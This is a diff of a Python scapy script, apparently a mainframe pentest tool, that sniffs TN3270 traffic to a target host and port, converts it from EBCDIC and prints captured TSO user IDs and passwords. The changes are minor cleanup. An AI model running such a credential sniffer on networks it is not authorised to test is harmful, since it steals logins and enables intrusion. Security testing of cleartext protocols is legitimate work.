@@ -48,7 +48,7 @@ interface = results.interface
 port = results.port
 ip_address = results.ip
 
-print "-{X}- Mainframe: ", ip_address,':',port
+print "-{X}- Mainframe: ", ip_address,':', port
 print "-{X}- Sniffer started on interface:", interface
 
 
@@ -85,7 +85,7 @@ def sniffTSO(pkt):
 	dst=pkt.sprintf("%IP.dst%")
 	dport=pkt.sprintf("%IP.dport%")
 	if dst == ip_address and dport == port and raw.__len__() < 200:
-		# If the destination and port match and the length of data is less than 200 chars 
+		# If the destination and port match and the length of data is less than 200 chars
 		# convert the raw string to an ebcdic string so we can search, etc
 		sniffed = EbcdicToAscii(raw[1:-1])
 		#print "[+] Length is", raw.__len__()
@@ -99,10 +99,8 @@ def sniffTSO(pkt):
                 else:
                     field = 'Password'
                 print "-{X}- Mainframe %s: %s" % (field, sniffed[m.end()-1:-1])
-	#print ""	
-		
+	#print ""
 
-# Start scapy sniffer on interface and 
+# Start scapy sniffer on interface and
 # pass all packets to the function sniffTSO
-sniff(iface=interface, prn=sniffTSO)
-
+sniff(iface=interface, prn=sniffTSO, store=False)
